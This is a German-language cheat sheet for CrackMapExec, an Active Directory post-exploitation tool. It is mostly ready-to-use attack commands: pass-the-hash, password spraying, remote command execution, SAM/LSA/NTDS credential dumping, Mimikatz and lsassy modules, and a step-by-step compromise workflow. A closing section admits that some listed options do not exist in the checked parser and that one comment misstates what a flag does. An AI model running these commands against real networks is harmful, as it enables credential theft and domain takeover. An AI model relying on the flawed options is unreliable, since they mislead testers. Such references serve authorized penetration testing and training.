# 🗡️ CrackMapExec – vielseitige Werkzeugsammlung für AD

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md)

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
   CrackMapExec – vielseitige Werkzeugsammlung für Penetrationstests
```

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist CrackMapExec?](#-was-ist-crackmapexec)
- [Installation](#-installation)
- [SMB-Protokoll](#-smb-protokoll)
- [WinRM-Protokoll](#-winrm-protokoll)
- [LDAP-Protokoll](#-ldap-protokoll)
- [MSSQL-Protokoll](#-mssql-protokoll)
- [SSH-Protokoll](#-ssh-protokoll)
- [Module](#-module)
- [Password Spraying](#-password-spraying)
- [Schnellübersicht](#-schnellübersicht)

---

## 🎯 Was ist CrackMapExec?

**CrackMapExec** (CME) ist ein Werkzeug für Netzwerkprüfungen nach einem ersten Zugriff (Post-Exploitation). Active Directory (AD) ist der Verzeichnisdienst von Microsoft. CME unterstützt:

- 🖥️ **SMB** – Freigaben, Sitzungen und Befehlsausführung
- 🔧 **WinRM** – Entfernte Verwaltung mit PowerShell
- 📂 **LDAP** – Informationen aus Active Directory erfassen
- 🗄️ **MSSQL** – SQL-Server-Angriffe
- 🐧 **SSH** – Linux-Zielsysteme
- 💉 **Pass-the-Hash** – Sich mit einem vorhandenen NT-Hash authentifizieren

### Funktionen

| Merkmal | Beschreibung |
|---------|-------------|
| **Mehrere Protokolle** | SMB, WinRM, LDAP, MSSQL, SSH |
| **Parallele Ausführung** | Mehrere Zielsysteme prüfen |
| **Zugangsdaten-Datenbank** | Ermittelte Zugangsdaten verwalten |
| **Module** | Durch eigene Module erweiterbar |
| **Ausgabeformate** | Verschiedene Ausgabemöglichkeiten |

---

## 🚀 Installation

### Kali Linux

```bash
# Über apt installieren
sudo apt update
sudo apt install crackmapexec

# Alternativ über pipx (empfohlen)
pipx install crackmapexec
```

### pipx verwenden

```bash
# Zuerst pipx installieren
sudo apt install pipx
pipx ensurepath

# CME installieren
pipx install crackmapexec
```

### Installation prüfen

```bash
crackmapexec --help
crackmapexec smb --help
```

---

<a name="-smb-protokoll"></a>

## 🖥️ SMB-Protokoll

### Grundlegende Bestandsaufnahme

```bash
# Prüfen, ob Hosts erreichbar sind
cme smb 10.10.10.0/24

# Mit Zugangsdaten Informationen erfassen
cme smb 10.10.10.10 -u user -p password

# Domänenauthentifizierung
cme smb 10.10.10.10 -u user -p password -d domain.local

# Lokale Authentifizierung
cme smb 10.10.10.10 -u administrator -p password --local-auth
```

### Pass-the-Hash

```bash
# SMB mit NTLM-Hash
cme smb 10.10.10.10 -u user -H NTLMHASH

# Vollständiger LM:NTLM-Hash
cme smb 10.10.10.10 -u user -H LM:NTLM

# Hash netzwerkweit prüfen
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

### Freigaben erfassen

```bash
# Freigaben auflisten
cme smb 10.10.10.10 -u user -p password --shares

# Freigaben nach Dateien durchsuchen
cme smb 10.10.10.10 -u user -p password --spider C$ --pattern txt

# Dateien rekursiv auflisten
cme smb 10.10.10.10 -u user -p password --spider-folder /path --depth 3
```

### Benutzer erfassen

```bash
# Benutzer über RPC auflisten
cme smb 10.10.10.10 -u user -p password --users

# Gruppen auflisten
cme smb 10.10.10.10 -u user -p password --groups

# Angemeldete Benutzer auflisten
cme smb 10.10.10.10 -u user -p password --loggedon-users

# SIDs von Benutzern ermitteln
cme smb 10.10.10.10 -u user -p password --rid-brute
```

### Befehle ausführen

```bash
# Befehl ausführen
cme smb 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell-Ausführung
cme smb 10.10.10.10 -u admin -p password -X "Get-Process"

# Verschiedene Ausführungsverfahren
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method atexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method mmcexec
```

### Zugangsdaten auslesen

```bash
# SAM auslesen
cme smb 10.10.10.10 -u admin -p password --sam

# LSA auslesen
cme smb 10.10.10.10 -u admin -p password --lsa

# NTDS.dit auslesen (benötigt laut Vorlage Domänenadministratorrechte auf dem DC)
cme smb DC01.domain.local -u admin -p password --ntds

# NTDS mit einem bestimmten Verfahren auslesen
cme smb DC01 -u admin -p password --ntds drsuapi
cme smb DC01 -u admin -p password --ntds vss
```

### SMB-Signierung

```bash
# SMB-Signierung prüfen (für Relay-Angriffe)
cme smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

## 🔧 WinRM-Protokoll

### Grundlegende Verwendung

```bash
# WinRM-Zugriff prüfen
cme winrm 10.10.10.10 -u user -p password

# Mehrere Ziele prüfen
cme winrm 10.10.10.0/24 -u user -p password

# Mit Hash
cme winrm 10.10.10.10 -u user -H NTLMHASH
```

### Befehle ausführen

```bash
# Befehl ausführen
cme winrm 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
cme winrm 10.10.10.10 -u admin -p password -X "Get-Process"

# Skript ausführen
cme winrm 10.10.10.10 -u admin -p password -X '$PSVersionTable'
```

### Zugangsdaten auslesen

```bash
# SAM über WinRM auslesen
cme winrm 10.10.10.10 -u admin -p password --sam

# LSA-Secrets
cme winrm 10.10.10.10 -u admin -p password --lsa
```

---

## 📂 LDAP-Protokoll

### Bestandsaufnahme

```bash
# Einfache LDAP-Abfrage
cme ldap DC01.domain.local -u user -p password

# Benutzer auflisten
cme ldap DC01 -u user -p password --users

# Gruppen auflisten
cme ldap DC01 -u user -p password --groups

# Für AS-REP Roasting geeignete Benutzer
cme ldap DC01 -u user -p password --asreproast asrep.txt

# Für Kerberoasting geeignete Benutzer
cme ldap DC01 -u user -p password --kerberoasting kerb.txt
```

### Passwortrichtlinie

```bash
# Passwortrichtlinie abrufen
cme ldap DC01 -u user -p password --password-policy
```

### Benutzerattribute

```bash
# Benutzerbeschreibungen abrufen
cme ldap DC01 -u user -p password -M get-desc-users

# Bestimmte Attribute abrufen
cme ldap DC01 -u user -p password --admin-count
```

---

<a name="-mssql-protokoll"></a>

## 🗄️ MSSQL-Protokoll

### Grundlegende Verwendung

```bash
# Mit MSSQL verbinden
cme mssql 10.10.10.10 -u sa -p password

# Windows-Authentifizierung
cme mssql 10.10.10.10 -u user -p password -d domain.local

# Mit Hash
cme mssql 10.10.10.10 -u user -H NTLMHASH -d domain.local
```

### Befehle ausführen

```bash
# Über xp_cmdshell ausführen
cme mssql 10.10.10.10 -u sa -p password -x "whoami"

# Zuerst xp_cmdshell aktivieren
cme mssql 10.10.10.10 -u sa -p password --enable-xp

# Befehl ausführen
cme mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"
```

---

## 🐧 SSH-Protokoll

### Grundlegende Verwendung

```bash
# SSH-Zugriff prüfen
cme ssh 10.10.10.10 -u root -p password

# Mehrere Ziele
cme ssh 10.10.10.0/24 -u user -p password

# Mit Schlüsseldatei
cme ssh 10.10.10.10 -u user --key-file id_rsa
```

### Befehle ausführen

```bash
# Befehl ausführen
cme ssh 10.10.10.10 -u root -p password -x "id"

# Mehrere Befehle
cme ssh 10.10.10.10 -u root -p password -x "cat /etc/passwd"
```

---

## 🧩 Module

### Module auflisten

```bash
# Alle Module auflisten
cme smb -L
cme winrm -L
cme ldap -L

# Modulhilfe
cme smb -M mimikatz --options
```

### Verbreitete Module

```bash
# Mimikatz
cme smb 10.10.10.10 -u admin -p password -M mimikatz

# Lsassy (LSASS auslesen)
cme smb 10.10.10.10 -u admin -p password -M lsassy

# WebDAV
cme smb 10.10.10.10 -u admin -p password -M webdav

# Petitpotam
cme smb 10.10.10.10 -u user -p password -M petitpotam

# GPP-Passwörter
cme smb DC01 -u user -p password -M gpp_password

# GPP-AutoLogon
cme smb DC01 -u user -p password -M gpp_autologin

# Spider Plus
cme smb 10.10.10.10 -u user -p password -M spider_plus
```

### Daten für BloodHound sammeln

```bash
# BloodHound-Daten erfassen
cme ldap DC01 -u user -p password --bloodhound -ns DC01 -c All
```

---

## 🔓 Password Spraying

Beim Password Spraying werden wenige Passwortkandidaten gegen mehrere Konten geprüft.

### Grundlegendes Password Spraying

```bash
# Ein einzelnes Passwort gegen mehrere Benutzer prüfen
cme smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Mehrere Passwörter
cme smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# Kein Brute Force (laut Vorlage jede Kombination prüfen)
cme smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

### Netzwerkweites Password Spraying

```bash
# Passwort netzwerkweit prüfen
cme smb 10.10.10.0/24 -u user -p 'Password123!' --continue-on-success

# Ziele aus einer Datei
cme smb targets.txt -u admin -p password --continue-on-success
```

### Kontosperren berücksichtigen

```bash
# Zuerst die Passwortrichtlinie prüfen
cme ldap DC01 -u user -p password --password-policy

# Ausgabe:
# Minimum password length: 8
# Password history length: 24
# Lockout threshold: 5
# Lockout duration: 30 minutes
```

---

## 💾 Datenbank

### CME-Datenbank

```bash
# Zugangsdaten anzeigen
cmedb

# Innerhalb von cmedb:
creds           # Gespeicherte Zugangsdaten auflisten
hosts           # Erfasste Hosts auflisten
```

### Daten exportieren

```bash
# Ausgabeformate
cme smb 10.10.10.10 -u user -p password --log log.txt

# JSON-Ausgabe
cme smb 10.10.10.10 -u user -p password --json
```

---

## 📊 Schnellübersicht

### Authentifizierungsverfahren

| Verfahren | Option |
|--------|--------|
| Passwort | `-p password` |
| NTLM-Hash | `-H HASH` |
| AES-Schlüssel | `--aesKey KEY` |
| Kerberos | `-k` |
| Lokale Authentifizierung | `--local-auth` |

### Protokolle

| Protokoll | Port | Einsatzzweck |
|----------|------|----------|
| SMB | 445 | Dateifreigaben, Befehlsausführung |
| WinRM | 5985/5986 | PowerShell-Remoting |
| LDAP | 389/636 | AD-Bestandsaufnahme |
| MSSQL | 1433 | SQL Server |
| SSH | 22 | Linux-Systeme |

### Häufige Optionen

| Option | Beschreibung |
|------|-------------|
| `-u` | Benutzername (oder Datei) |
| `-p` | Passwort (oder Datei) |
| `-H` | NTLM-Hash |
| `-d` | Domäne |
| `-x` | Befehl (cmd) |
| `-X` | Befehl (PowerShell) |
| `--shares` | Freigaben auflisten |
| `--users` | Benutzer auflisten |
| `--sam` | SAM auslesen |
| `--lsa` | LSA auslesen |
| `--ntds` | NTDS auslesen |

### Ausgabemarkierungen

| Markierung | Bedeutung |
|--------|---------|
| `[+]` | Erfolg |
| `[-]` | Fehlschlag |
| `[*]` | Information |
| `(Pwn3d!)` | Administratorzugriff bestätigt |

### Typischer Ablauf

```bash
# 1. Netzwerksuche
cme smb 10.10.10.0/24

# 2. Password Spraying
cme smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# 3. Administratorzugriff prüfen
cme smb 10.10.10.0/24 -u user -p password

# 4. Zugangsdaten auslesen
cme smb 10.10.10.10 -u admin -p password --sam --lsa

# 5. Ermittelte Zugangsdaten verwenden
cme smb 10.10.10.0/24 -u newuser -H NEWHASH
```

---

## 📚 Ressourcen

- [CrackMapExec GitHub](https://github.com/Porchetta-Industries/CrackMapExec)
- [CrackMapExec-Wiki](https://wiki.porchetta.industries/)
- [CME-Module](https://github.com/Porchetta-Industries/CrackMapExec/tree/master/cme/modules)

### Verwandte Cheatsheets
- [BloodHound](../../BloodHound/translations/README.de.md)
- [Impacket](../../Impacket/translations/README.de.md)
- [Mimikatz](../../Mimikatz/translations/README.de.md)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Projekt und Versionen:** Das ursprüngliche CME-Repository ist archiviert und wird nicht mehr gepflegt. NetExec wird als Fortsetzung entwickelt; Namen, Installationswege, Module und Optionen sind deshalb nicht pauschal austauschbar. Die ursprünglichen CME-Beispiele bleiben erhalten. [CME: Projektstatus](https://github.com/byt3bl33d3r/CrackMapExec), [Kali: NetExec als Fortsetzung](https://www.kali.org/tools/netexec/).
- **Optionskontext:** Die Vorlage mischt unvollständige und versionsabhängige Aufrufe. Im geprüften CME-Parser steht die Passwortrichtlinienoption beim SMB-Protokoll; die gezeigte LDAP-Option --password-policy ist dort nicht definiert. Ebenso ist --enable-xp kein definierter MSSQL-Schalter dieses Parsers. Der Spider-Ordner allein wählt noch keine Freigabe aus. Auch --json steht nicht in der geprüften allgemeinen CLI-Definition. Die Originaloptionen werden nicht stillschweigend ersetzt. [CME: SMB-Optionen](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb/proto_args.py), [LDAP-Optionen](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/ldap/proto_args.py), [MSSQL-Optionen](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/mssql/proto_args.py), [allgemeine CLI](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/cli.py).
- **Passwortkombinationen und Kontosperren:** Die Kommentarzeile zu no-bruteforce ist irreführend: Bei Benutzer- und Passwortdatei ordnet diese Option die Einträge paarweise zu, statt sämtliche Kombinationen durchzuprobieren. continue-on-success setzt Versuche nach einem Erfolg fort; es ist keine Garantie gegen Kontosperren. Die angezeigte Richtlinie ist nur eine Beispielausgabe und kein gemessener Zustand. [CME: Argumentdefinition und Anmeldelogik](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/cli.py), [CME: Authentifizierungsablauf](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/connection.py).
- **Rechte und Ergebnisbewertung:** Ein erfolgreicher Login, offene Freigaben oder die Markierung Pwn3d! garantieren nicht jede weitere Aktion. Berechtigungen, Dienste, Authentifizierungsverfahren und konkrete Zielkonfiguration müssen passen. Die unterschiedlichen NTDS-Verfahren benötigen unterschiedliche Voraussetzungen; eine Mitgliedschaft bei Domain Admins ist keine universelle Beschreibung der effektiv benötigten Rechte. Fehlende verpflichtende SMB-Signierung allein beweist zudem keinen erfolgreichen Relay-Angriff. [CME: SMB-Prüfungen und NTDS-Verfahren](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb.py), [CME: Relay-Liste](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb/proto_args.py).
- **Daten und Module:** Ausführung und Dumping sind zustandsverändernde beziehungsweise Daten lesende Vorgänge, keine bloßen Erreichbarkeitstests. Die Datenbank kann Zugangsdaten enthalten. Modulnamen und deren Voraussetzungen müssen zur jeweiligen Installation passen; ein in der Vorlage genannter Modulname ist keine Zusage zur Verfügbarkeit. [CME: Modulverzeichnis](https://github.com/byt3bl33d3r/CrackMapExec/tree/master/cme/modules), [CME: Verbindung und Modulaufrufe](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/connection.py).

---

<p align="center">
  <b>🗡️ Netzwerke systematisch prüfen!</b><br>
  <i>CrackMapExec – eine vielseitige Werkzeugsammlung für Penetrationstests</i>
</p>
